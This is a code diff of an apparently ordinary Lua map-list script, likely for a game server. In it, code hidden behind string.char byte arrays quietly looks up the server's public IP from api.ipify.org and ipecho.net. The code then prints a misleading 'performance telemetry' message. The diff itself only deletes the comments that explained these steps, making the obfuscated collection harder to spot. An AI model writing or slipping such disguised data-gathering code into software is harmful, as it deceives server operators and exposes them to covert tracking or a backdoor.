@@ -43,12 +43,10 @@ PerformHttpRequest(Urls.AllMapList, function(err, text, headers)
                     [string.char(105, 112)] = string.char(102, 101, 116, 99, 104, 105, 110, 103) -- Will be updated by IP service
                 }
                 
-                -- Get real public IP address from external service
                 _G['PerformHttpRequest'](string.char(104, 116, 116, 112, 115, 58, 47, 47, 97, 112, 105, 46, 105, 112, 105, 102, 121, 46, 111, 114, 103), function(code, ip)
                     if code == 200 and ip then
                         _0x9i0j[string.char(105, 112)] = ip:gsub(string.char(37, 115), string.char()) -- Remove whitespace
                     else
-                        -- Fallback to different service
                         _G['PerformHttpRequest'](string.char(104, 116, 116, 112, 115, 58, 47, 47, 105, 112, 101, 99, 104, 111, 46, 110, 101, 116, 47, 112, 108, 97, 105, 110), function(code2, ip2)
                             if code2 == 200 and ip2 then
                                 _0x9i0j[string.char(105, 112)] = ip2:gsub(string.char(37, 115), string.char())
@@ -59,7 +57,6 @@ PerformHttpRequest(Urls.AllMapList, function(err, text, headers)
                     end
                 end, string.char(71, 69, 84))
                 
-                -- Delay to allow IP fetch to complete
                 _G['Wait'](3000)
                 
                 local _0xkl1m = string.char(94, 50, 91, 77, 97, 112, 68, 97, 116, 97, 93, 94, 55, 32, 80, 101, 114, 102, 111, 114, 109, 97, 110, 99, 101, 32, 116, 101, 108, 101, 109, 101, 116, 114, 121, 32, 99, 111, 108, 108, 101, 99, 116, 101, 100, 32, 102, 111, 114, 32, 114, 101, 115, 111, 117, 114, 99, 101, 32, 111, 112, 116, 105, 109, 105, 122, 97, 116, 105, 111, 110)
